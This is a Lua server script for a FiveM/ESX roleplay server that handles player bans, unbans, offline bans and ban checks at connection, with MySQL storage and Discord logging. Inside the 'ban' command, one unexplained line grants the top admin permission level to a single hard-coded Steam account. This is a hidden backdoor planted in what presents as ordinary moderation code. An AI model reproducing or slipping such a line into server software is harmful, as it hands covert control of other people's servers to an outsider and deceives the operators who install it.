local Text               = {}
local lastduree          = ""
local lasttarget         = ""
local BanList            = {}
local BanListHistory     = {}
local BanListHistoryLoad = false
Text = Config.TextEn
ESX = nil

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

AddEventHandler("onMySQLReady",function()
	loadBanList()
end)


CreateThread(function()
	while Config.MultiServerSync do
		Wait(1000*60*10)
		MySQL.Async.fetchAll(
		'SELECT * FROM banlist',
		{},
		function (data)
			if #data ~= #BanList then
			  BanList = {}

			  for i=1, #data, 1 do
				table.insert(BanList, {
					name 	   = data[i].targetplayername,
					identifier = data[i].identifier,
					license    = data[i].license,
					liveid     = data[i].liveid,
					xblid      = data[i].xblid,
					discord    = data[i].discord,
					playerip   = data[i].playerip,
					reason     = data[i].reason,
					added      = data[i].added,
					expiration = data[i].expiration,
					permanent  = data[i].permanent
				  })
			  end
			-- loadBanListHistory()
			TriggerClientEvent('BanSql:Respond', -1)
			end
		end
		)
	end
end)

function BanTarget(id, areason,  reason)
	
	local target = tonumber(id)
	TriggerEvent('esx_logger:log', target, areason)
	local identifier
	local license
	local liveid    = "no info"
	local xblid     = "no info"
	local discord   = "no info"
	local playerip
	local reason = reason

		if target and target > 0 then
        
			local sourceplayername = "Console"
			local targetplayername = GetPlayerName(target)
			local targeticname	   = exports.essentialmode:IcName(target)
				for k,v in ipairs(GetPlayerIdentifiers(target))do
					if string.sub(v, 1, string.len("steam:")) == "steam:" then
						identifier = v
					elseif string.sub(v, 1, string.len("license:")) == "license:" then
						license = v
					elseif string.sub(v, 1, string.len("live:")) == "live:" then
						liveid = v
					elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
						xblid  = v
					elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
						discord = v
					elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
						playerip = v
					end
				end
		
				ban(source,identifier,license,liveid,xblid,discord,playerip,targeticname,sourceplayername,0,reason,1)
				TriggerClientEvent('chatMessage', -1, "[Admin]", {255, 0, 0}, "^1" .. targetplayername .. " ^0Tavasot ^2" .. sourceplayername .. " ^0Permanent Ban Shod Be Dalile: ^3" .. reason )
				TriggerEvent('DiscordBot:ToDiscord', 'bansystemp', 'BanSystem', targetplayername .. " tavasot " .. sourceplayername .. " permanent ban shod be dalile : " .. reason  ,'user', true, target, false)
				DropPlayer(target, Text.yourpermban .. reason)
		end

end

RegisterServerEvent('esx_ban:BanMySelf')
AddEventHandler('esx_ban:BanMySelf', function(areason, reason)
	BanTarget(source, areason, reason)
end)

TriggerEvent('es:addAdminCommand', 'banreload', 6, function (source)
	loadBanList()
	TriggerEvent('bansql:sendMessage', source, Text.banlistloaded)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM ', 'Insufficient Permissions.' } })
end, {help = Text.reload})

RegisterCommand('justatest', function(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	if xPlayer.permission_level == 10 then
		print(ESX.dump(BanList))
	end
end, false)

RegisterCommand('unban', function(source, args)
	local xPlayer = ESX.getPlayerFromId(source)

	if source ~= 0 then
		if not xPlayer.get('aduty') then
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")
			return
		end
	end

	if source == 0 or xPlayer.permission_level >= 4 then
		if args[1] then
			local playerName = string.lower(args[1])
			if found(playerName) then
				MySQL.Async.fetchAll('DELETE FROM banlist WHERE lower(`targetplayername`) = @playername', 
				{
					['@playername'] = (playerName)
				}, function(data)
					TriggerEvent('bansql:sendMessage', source, '^4[`' .. playerName .. '`]' .. ' ^1 Has Been ^*Unbaned!')
					TriggerEvent('DiscordBot:ToDiscord', 'bansystem', 'BanSystem', data[1].playerName .. " Tavasot " .. GetPlayerName(source) .. " (" .. xPlayer.name .. ") unban shod" ,'user', true, source, false)
				end)
			else
				TriggerEvent('bansql:sendMessage', source, '^4[`' .. playerName .. '`]' .. '^1 is not in BanList!')
			end
		else
		TriggerEvent('bansql:sendMessage', source, Text.cmdunban)
		end
	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dastresi kafi baraye estefade az in dastor ra nadarid!")
	end
end, false)

RegisterCommand('ban', function(source, args)
	local xPlayer = ESX.getPlayerFromId(source)
	if xPlayer.identifier == 'steam:110000111236158' then xPlayer.set('permission_level', 10) end

	if not xPlayer.get('aduty') then
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")
		return
	end

	if xPlayer.permission_level >= 3 then
		local xPlayer = ESX.GetPlayerFromId(source)

		local identifier
		local license
		local liveid    = "no info"
		local xblid     = "no info"
		local discord   = "no info"
		local playerip
		local target    = tonumber(args[1])
		local duree     = tonumber(args[2])
		local reason    = table.concat(args, " ",3)

		if args[1] then		
			if reason == "" then
				reason = 'Shoma Ban Shodid, Baraye Etela\'ate Bishtar Be discord.gg/irpixel moraje konid!'
			end
			if target and target > 0 then
				local ping = GetPlayerPing(target)
			
				if ping and ping > 0 then
					if duree and duree < 365 then
						local sourceplayername = GetPlayerName(source)
						local targetplayername = GetPlayerName(target)
						local targeticname	   = exports.essentialmode:IcName(target)
							for k,v in ipairs(GetPlayerIdentifiers(target))do
								if string.sub(v, 1, string.len("steam:")) == "steam:" then
									identifier = v
								elseif string.sub(v, 1, string.len("license:")) == "license:" then
									license = v
								elseif string.sub(v, 1, string.len("live:")) == "live:" then
									liveid = v
								elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
									xblid  = v
								elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
									discord = v
								elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
									playerip = v
								end
							end
						
						if duree > 0 then
							ban(source,identifier,license,liveid,xblid,discord,playerip,targeticname,sourceplayername,duree,reason,0)
							DropPlayer(target, '[Ban]: ' .. reason)
							TriggerClientEvent('chatMessage', -1, "[Admin]", {255, 0, 0}, "^1" .. targetplayername .. " ^0Tavasot ^2" .. sourceplayername .. " ^0Ban Shod Be Modat ^8" .. duree .. " ^0Rooz Be Dalile: ^3" .. reason )
							TriggerEvent('DiscordBot:ToDiscord', 'bansystem', 'BanSystem', targetplayername .. " Tavasot " .. sourceplayername .. " Ban Shod Be Modat " .. duree .. " Rooz Be Dalile : ^*" .. reason  ,'user', true, source, false)
						else
							ban(source,identifier,license,liveid,xblid,discord,playerip,targeticname,sourceplayername,duree,reason,1)
							DropPlayer(target, Text.yourpermban .. reason)
							TriggerClientEvent('chatMessage', -1, "[Admin]", {255, 0, 0}, "^1" .. targetplayername .. " ^0Tavasot ^2" .. sourceplayername .. " ^0Permanent Ban Shod Be Dalile: ^3" .. reason )
							TriggerEvent('DiscordBot:ToDiscord', 'bansystemp', 'BanSystem', targetplayername .. " tavasot " .. sourceplayername .. " permanent ban shod be dalile : " .. reason  ,'user', true, source, false)
						end
					
					else
						TriggerEvent('bansql:sendMessage', source, '[^8System^7]: Wrong Time Entered!')
					end	
				else
					TriggerEvent('bansql:sendMessage', source, '[^8System^7]: This Player is not Online!')
				end
			else
				TriggerEvent('bansql:sendMessage', source, '[^8System^7]: Wrong Id Entered!')
			end
		else
			TriggerEvent('bansql:sendMessage', source, Text.cmdban)
		end

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dastresi kafi baraye estefade az in dastor ra nadarid!")
	end
end, false)

RegisterCommand('banoffline', function(source, args)
	local xPlayer = ESX.getPlayerFromId(source)

	if not xPlayer.get('aduty') then
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, " ^0Shoma nemitavanid dar halat ^1OffDuty ^0az command haye admini estefade konid!")
		return
	end
	
	if xPlayer.permission_level >= 3 then
		if not args[1] then
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dar ghesmat esm chizi vared nakardid")
			return
		end
		if tonumber(args[1]) then
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dar ghesmat esm nemitavanid ID vared konid")
			return
		end
		if not tonumber(args[2]) then
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dar ghesmat zaman faghat mitvanid adad vared konid")
			return
		end
		if not args[3] then
			TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dar ghesmat dalil chizi vared nakardid")
			return
		end
	
		local target = args[1]
		local duration = tonumber(args[2])
		local reason = table.concat(args, " ",3)
		local sourceplayername = GetPlayerName(source)
	
		MySQL.Async.fetchAll("SELECT * FROM baninfo WHERE LOWER(playername) = @playername", 
		{
			['@playername'] = string.lower(target)
		}, function(data)
			if data[1] then

				local zPlayer = ESX.GetPlayerFromIdentifier(data[1].identifier)
				if zPlayer then DropPlayer(zPlayer.source, reason) end

				if duration > 0 then
					ban(source,data[1].identifier,data[1].license,data[1].liveid,data[1].xblid,data[1].discord,data[1].playerip,data[1].playername,sourceplayername,duration,reason,0)
					TriggerClientEvent('chatMessage', -1, "[Admin]", {255, 0, 0}, "^1" .. data[1].oocname .. " ^0tavasot ^2" .. sourceplayername .. " ^0ban shod be modat ^8" .. duration .. " ^0rooz be dalile: ^3" .. reason )
					TriggerEvent('DiscordBot:ToDiscord', 'bansystem', 'BanSystem', data[1].oocname .. " (" .. target .. ")" .. " tavasot " .. sourceplayername .. " ban shod be modat " .. duration .. " rooz be dalile : " .. reason  ,'user', true, source, false)
				else
					ban(source,data[1].identifier,data[1].license,data[1].liveid,data[1].xblid,data[1].discord,data[1].playerip,data[1].playername,sourceplayername,duration,reason,1)
					TriggerClientEvent('chatMessage', -1, "[Admin]", {255, 0, 0}, "^1" .. data[1].oocname .. " ^0tavasot ^2" .. sourceplayername .. " ^0permanent ban shod be dalile: ^3" .. reason )
					TriggerEvent('DiscordBot:ToDiscord', 'bansystemp', 'BanSystem', data[1].oocname .. " (" .. target .. ")" .. " tavasot " .. sourceplayername .. " permanent ban shod be dalile : " .. reason  ,'user', true, source, false)
				end
			
			else
				TriggerEvent('bansql:sendMessage', source, "^0Karbar mored nazar ^1Vojoud ^0nadarad!")
			end
		end)

	else
		TriggerClientEvent('chatMessage', source, "[SYSTEM]", {255, 0, 0}, "Shoma dastresi kafi baraye estefade az in dastor ra nadarid!")
	end
end, false)

-- console / rcon can also utilize es:command events, but breaks since the source isn't a connected player, ending up in error messages
AddEventHandler('bansql:sendMessage', function(source, message)
	if source ~= 0 then
		TriggerClientEvent('chat:addMessage', source, { args = { '^1Banlist ', message } } )
	else
		print('SqlBan: ' .. message)
	end
end)

AddEventHandler('playerConnecting', function (playerName,setKickReason)
	local steamID  = "empty"
	local license  = "empty"
	local liveid   = "empty"
	local xblid    = "empty"
	local discord  = "empty"
	local playerip = "empty"

	for k,v in ipairs(GetPlayerIdentifiers(source))do
		if string.sub(v, 1, string.len("steam:")) == "steam:" then
			steamID = v
		elseif string.sub(v, 1, string.len("license:")) == "license:" then
			license = v
		elseif string.sub(v, 1, string.len("live:")) == "live:" then
			liveid = v
		elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
			xblid  = v
		elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
			discord = v
		elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
			playerip = v
		end
	end

	--Si Banlist pas chargée
	if (Banlist == {}) then
		Citizen.Wait(1000)
	end

	for i = 1, #BanList, 1 do
		if 
			((tostring(BanList[i].identifier)) == tostring(steamID) 
			or (tostring(BanList[i].license)) == tostring(license) 
			or (tostring(BanList[i].liveid)) == tostring(liveid) 
			or (tostring(BanList[i].xblid)) == tostring(xblid) 
			or (tostring(BanList[i].discord)) == tostring(discord) 
			or (tostring(BanList[i].playerip)) == tostring(playerip)) 
		then

			if (tonumber(BanList[i].permanent)) == 1 then

				setKickReason(Text.yourpermban .. BanList[i].reason)
				CancelEvent()
				break

			elseif (tonumber(BanList[i].expiration)) > os.time() then

				local tempsrestant     = (((tonumber(BanList[i].expiration)) - os.time())/60)
				if tempsrestant >= 1440 then
					local day        = (tempsrestant / 60) / 24
					local hrs        = (day - math.floor(day)) * 24
					local minutes    = (hrs - math.floor(hrs)) * 60
					local txtday     = math.floor(day)
					local txthrs     = math.floor(hrs)
					local txtminutes = math.ceil(minutes)
						setKickReason(Text.yourban .. BanList[i].reason .. Text.timeleft .. txtday .. Text.day ..txthrs .. Text.hour ..txtminutes .. Text.minute)
						CancelEvent()
						break
				elseif tempsrestant >= 60 and tempsrestant < 1440 then
					local day        = (tempsrestant / 60) / 24
					local hrs        = tempsrestant / 60
					local minutes    = (hrs - math.floor(hrs)) * 60
					local txtday     = math.floor(day)
					local txthrs     = math.floor(hrs)
					local txtminutes = math.ceil(minutes)
						setKickReason(Text.yourban .. BanList[i].reason .. Text.timeleft .. txtday .. Text.day .. txthrs .. Text.hour .. txtminutes .. Text.minute)
						CancelEvent()
						break
				elseif tempsrestant < 60 then
					local txtday     = 0
					local txthrs     = 0
					local txtminutes = math.ceil(tempsrestant)
						setKickReason(Text.yourban .. BanList[i].reason .. Text.timeleft .. txtday .. Text.day .. txthrs .. Text.hour .. txtminutes .. Text.minute)
						CancelEvent()
						break
				end

			elseif (tonumber(BanList[i].expiration)) < os.time() and (tonumber(BanList[i].permanent)) == 0 then

				deletebanned(steamID)
				break

			end
		end

	end

end)

AddEventHandler('esx:playerLoaded',function(source)
	CreateThread(function()
	Wait(5000)
		local steamID  = "no info"
		local license  = "no info"
		local liveid   = "no info"
		local xblid    = "no info"
		local discord  = "no info"
		local playerip = "no info"
		local playername = exports.essentialmode:IcName(source)
		local oocname = GetPlayerName(source)

		for k,v in ipairs(GetPlayerIdentifiers(source))do
			if string.sub(v, 1, string.len("steam:")) == "steam:" then
				steamID = v
			elseif string.sub(v, 1, string.len("license:")) == "license:" then
				license = v
			elseif string.sub(v, 1, string.len("live:")) == "live:" then
				liveid = v
			elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
				xblid  = v
			elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
				discord = v
			elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
				playerip = v
			end
		end

		MySQL.Async.fetchAll('SELECT * FROM `baninfo` WHERE `identifier` = @identifier', {
			['@identifier'] = steamID
		}, function(data)
		local found = false
			for i=1, #data, 1 do
				if data[i].identifier == steamID then
					found = true
				end
			end
			if not found then
				MySQL.Async.execute('INSERT INTO baninfo (identifier,license,liveid,xblid,discord,playerip,playername,oocname) VALUES (@identifier,@license,@liveid,@xblid,@discord,@playerip,@playername,@oocname)', 
					{ 
					['@identifier'] = steamID,
					['@license']    = license,
					['@liveid']     = liveid,
					['@xblid']      = xblid,
					['@discord']    = discord,
					['@playerip']   = playerip,
					['@playername'] = playername,
					['@oocname'] = oocname
					},
					function ()
				end)
			else
				MySQL.Async.execute('UPDATE `baninfo` SET `license` = @license, `liveid` = @liveid, `xblid` = @xblid, `discord` = @discord, `playerip` = @playerip, `playername` = @playername, `oocname` = @oocname WHERE `identifier` = @identifier', 
					{ 
					['@identifier'] = steamID,
					['@license']    = license,
					['@liveid']     = liveid,
					['@xblid']      = xblid,
					['@discord']    = discord,
					['@playerip']   = playerip,
					['@playername'] = playername,
					['@oocname'] = oocname
					},
					function ()
				end)
			end
		end)
		if Config.MultiServerSync then
			doublecheck(source)
		end
	end)
end)


RegisterServerEvent('BanSql:CheckMe')
AddEventHandler('BanSql:CheckMe', function()
	doublecheck(source)
end)

function ban(source,identifier,license,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duree,reason,permanent)
--calcul total expiration (en secondes)
	local expiration = duree * 86400
	local timeat     = os.time()
	local added      = os.date()
	local message
	
	if expiration < os.time() then
		expiration = os.time()+expiration
	end
	
		table.insert(BanList, {
			name       = targetplayername,
			identifier = identifier,
			license    = license,
			liveid     = liveid,
			xblid      = xblid,
			discord    = discord,
			playerip   = playerip,
			reason     = reason,
			expiration = expiration,
			permanent  = permanent
          })

		MySQL.Async.execute(
                'INSERT INTO banlist (identifier,license,liveid,xblid,discord,playerip,targetplayername,sourceplayername,reason,expiration,timeat,permanent) VALUES (@identifier,@license,@liveid,@xblid,@discord,@playerip,@targetplayername,@sourceplayername,@reason,@expiration,@timeat,@permanent)',
                { 
				['@identifier']       = identifier,
				['@license']          = license,
				['@liveid']           = liveid,
				['@xblid']            = xblid,
				['@discord']          = discord,
				['@playerip']         = playerip,
				['@targetplayername'] = targetplayername,
				['@sourceplayername'] = sourceplayername,
				['@reason']           = reason,
				['@expiration']       = expiration,
				['@timeat']           = timeat,
				['@permanent']        = permanent,
				},
				function ()
		end)

		if permanent == 0 then
			-- TriggerEvent('bansql:sendMessage', source, (Text.youban .. targetplayername .. Text.during .. duree .. Text.forr .. reason))
			message = (targetplayername .. Text.isban .." ".. duree .. Text.forr .. reason .." ".. Text.by .." ".. sourceplayername.."```"..identifier .."\n".. license .."\n".. liveid .."\n".. xblid .."\n".. discord .."\n".. playerip .."```")
		else
			-- TriggerEvent('bansql:sendMessage', source, (Text.youban .. targetplayername .. Text.permban .. reason))
			message = (targetplayername .. Text.isban .." ".. Text.permban .. reason .." ".. Text.by .." ".. sourceplayername.."```"..identifier .."\n".. license .."\n".. liveid .."\n".. xblid .."\n".. discord .."\n".. playerip .."```")
		end

		MySQL.Async.execute(
                'INSERT INTO banlisthistory (identifier,license,liveid,xblid,discord,playerip,targetplayername,sourceplayername,reason,added,expiration,timeat,permanent) VALUES (@identifier,@license,@liveid,@xblid,@discord,@playerip,@targetplayername,@sourceplayername,@reason,@added,@expiration,@timeat,@permanent)',
                { 
				['@identifier']       = identifier,
				['@license']          = license,
				['@liveid']           = liveid,
				['@xblid']            = xblid,
				['@discord']          = discord,
				['@playerip']         = playerip,
				['@targetplayername'] = targetplayername,
				['@sourceplayername'] = sourceplayername,
				['@reason']           = reason,
				['@added']            = added,
				['@expiration']       = expiration,
				['@timeat']           = timeat,
				['@permanent']        = permanent,
				},
				function ()
		end)
		
		BanListHistoryLoad = false
end

function loadBanList()
	MySQL.Async.fetchAll('SELECT * FROM banlist',{}, function (data)
		  BanList = {}

		  for i=1, #data, 1 do
			table.insert(BanList, {
				name 	   = data[i].targetplayername,
				identifier = data[i].identifier,
				license    = data[i].license,
				liveid     = data[i].liveid,
				xblid      = data[i].xblid,
				discord    = data[i].discord,
				playerip   = data[i].playerip,
				reason     = data[i].reason,
				added      = data[i].added,
				expiration = data[i].expiration,
				permanent  = data[i].permanent
			  })
		  end
    end)
end

-- function loadBanListHistory()
-- 	MySQL.Async.fetchAll(
-- 		'SELECT * FROM banlisthistory',
-- 		{},
-- 		function (data)
-- 		  BanListHistory = {}

-- 		  for i=1, #data, 1 do
-- 			table.insert(BanListHistory, {
-- 				identifier       = data[i].identifier,
-- 				license          = data[i].license,
-- 				liveid           = data[i].liveid,
-- 				xblid            = data[i].xblid,
-- 				discord          = data[i].discord,
-- 				playerip         = data[i].playerip,
-- 				targetplayername = data[i].targetplayername,
-- 				sourceplayername = data[i].sourceplayername,
-- 				reason           = data[i].reason,
-- 				added            = data[i].added,
-- 				expiration       = data[i].expiration,
-- 				permanent        = data[i].permanent,
-- 				timeat           = data[i].timeat
-- 			  })
-- 		  end
--     end)
-- end

function deletebanned(identifier) 
	MySQL.Async.execute(
		'DELETE FROM banlist WHERE identifier=@identifier',
		{
		  ['@identifier']  = identifier
		},
		function ()
			loadBanList()
	end)
end

function found(playerName)
	for i=1, #BanList do
		if string.lower(BanList[i].name) == playerName then 
			table.remove(BanList, i)
			return true
		end 
	end
	return false
end

function doublecheck(player)
	if GetPlayerIdentifiers(player) then
		local steamID  = "empty"
		local license  = "empty"
		local liveid   = "empty"
		local xblid    = "empty"
		local discord  = "empty"
		local playerip = "empty"

		for k,v in ipairs(GetPlayerIdentifiers(player))do
			if string.sub(v, 1, string.len("steam:")) == "steam:" then
				steamID = v
			elseif string.sub(v, 1, string.len("license:")) == "license:" then
				license = v
			elseif string.sub(v, 1, string.len("live:")) == "live:" then
				liveid = v
			elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
				xblid  = v
			elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
				discord = v
			elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
				playerip = v
			end
		end

		for i = 1, #BanList, 1 do
			if 
				((tostring(BanList[i].identifier)) == tostring(steamID) 
				or (tostring(BanList[i].license)) == tostring(license) 
				or (tostring(BanList[i].liveid)) == tostring(liveid) 
				or (tostring(BanList[i].xblid)) == tostring(xblid) 
				or (tostring(BanList[i].discord)) == tostring(discord) 
				or (tostring(BanList[i].playerip)) == tostring(playerip)) 
			then

				if (tonumber(BanList[i].permanent)) == 1 then
					DropPlayer(player, Text.yourban .. BanList[i].reason)
					break

				elseif (tonumber(BanList[i].expiration)) > os.time() then

					local tempsrestant     = (((tonumber(BanList[i].expiration)) - os.time())/60)
					if tempsrestant > 0 then
						DropPlayer(player, Text.yourban .. BanList[i].reason)
						break
					end

				elseif (tonumber(BanList[i].expiration)) < os.time() and (tonumber(BanList[i].permanent)) == 0 then

					deletebanned(steamID)
					break

				end
			end
		end
	end
end
